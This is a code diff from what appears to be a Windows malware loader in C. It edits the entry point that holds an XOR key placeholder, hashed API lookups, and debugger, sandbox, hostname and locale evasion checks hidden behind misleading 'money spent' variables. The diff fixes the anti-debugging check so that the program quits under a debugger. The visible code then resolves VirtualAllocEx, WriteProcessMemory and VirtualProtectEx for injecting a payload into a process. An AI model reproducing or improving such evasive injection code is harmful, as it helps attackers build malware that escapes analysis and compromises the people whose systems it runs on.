@@ -13,7 +13,7 @@
 typedef void (*DllEntryPoint)(HINSTANCE, DWORD, LPVOID);
 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
-
+    
     // Seed the random number generator
     srand(time(NULL));
     uint16_t key = %XOR_KEY%; // Placeholder for XOR key
@@ -29,13 +29,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     HMODULE hUser32dll = NULL; // Placeholder for Kernel32 module handle
     
     // Check if the program is being debugged
-    if (!is_being_debugged()) {
+    if (is_being_debugged()) {
         printf("Error during file openning\n"); // Debugging detected
         return 1;
     } else {
         hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
     }
-    
+
     // Validate hostname and adjust money spent accordingly
     const char* hostname = get_hostname(hKernel32dll);
     if (key > 0 && is_valid_hostname(hostname)) {
@@ -44,13 +44,14 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         money_spent += multiply(money, 3); // Penalty for invalid hostname
     }
 
+
     // Validate computer and adjust money spent
     if (is_valid_computer(hKernel32dll) && money > 1000) {
         // Valid computer, no action needed
     } else {
         money_spent += divide(money, 2); // Penalty for invalid computer
     }
-    
+
     // Validate language settings and adjust money spent
     if (!is_valid_language(hKernel32dll, hUser32dll)) {
         money_spent += add(money, 500); // Penalty for invalid language
@@ -71,7 +72,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
             Sleep(delay); // Simulate processing delay
         }
     } else {
-
         VirtualAllocEx_t _AllocVirtMem = (VirtualAllocEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_ALLOC_HASH);
         WriteProcessMemory_t _WriteVirtMem = (WriteProcessMemory_t)CustomGetProcAddress(hKernel32dll, WRITE_MEMORY_HASH);
         VirtualProtectEx_t _ProtectVirtMem = (VirtualProtectEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_PROTECT_HASH);
